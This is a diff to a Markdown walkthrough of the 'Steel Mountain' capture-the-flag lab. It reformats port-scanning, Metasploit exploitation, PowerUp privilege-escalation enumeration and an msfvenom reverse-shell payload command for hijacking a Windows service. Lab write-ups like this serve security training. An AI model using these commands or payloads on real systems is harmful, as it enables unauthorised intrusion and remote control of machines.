@@ -1,7 +1,13 @@
-Let's begin by exporting the IP as 'target' in the environment variables: `export target=IP`
+Let's begin by exporting the IP as 'target' in the environment variables:
+```
+export target=IP
+```
 ![](https://github.com/user-attachments/assets/d725ed03-afb0-494a-b2b8-affaa7c3391e)
 
-Create a 'SteelMountain' directory and scan the network with rustscan followed by a more precise scan with nmap: `rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan`
+Create a 'SteelMountain' directory and scan the network with rustscan followed by a more precise scan with nmap:
+```
+rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
+```
 ![](https://github.com/user-attachments/assets/3cc166e7-a692-4bae-8e1c-89fbbcf55681)
 
 ![](https://github.com/user-attachments/assets/ea4285ba-2bc5-4a98-ae95-a6a6dd5777ea)
@@ -20,7 +26,10 @@ First, we will exploit this using Metasploit. Let's fire it up and search for re
 ![](https://github.com/user-attachments/assets/54502ade-ccaa-4674-9598-39aef6bdf409)
 We will use the 2014 one: `use 1`.
 
-Now let's configure the options `show options` and let's make some changes:
+Now let's configure the options:
+```
+show options`
+```
 ```
 set RHOSTS <target IP>
 set RPORT 8080
@@ -38,14 +47,20 @@ STEELMOUNTAIN\bill
 Now we will use the `upload` functionality of meterpreter to upload `PowerUp.ps1` in the `%TEMP%` folder:
 ![](https://github.com/user-attachments/assets/928397a9-fd95-4ee7-a4a5-ec8a8f4c544c)
 
-It's time to `load powershell` and open `powershell_shell` to fire up `PowerUp.ps1` and `Invoke-AllChecks` to do some enumeration:
+It's time to fire up PowerUp.ps1 to do some enumeration:
+```
+load powershell
+powershell_shell
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
 ![](https://github.com/user-attachments/assets/16778245-36ec-4fc0-9877-7ed4e9bd9b7f)
 
 The first entry is what we need.
 An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` permissions, running as `LocalSystem` to escalate our privileges.
 `PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but we will focus on the insecure service permissions one.
 
-What we need now is to exit from the powershell instance `CTRL+C` and enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
+What we need now is to enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 ```
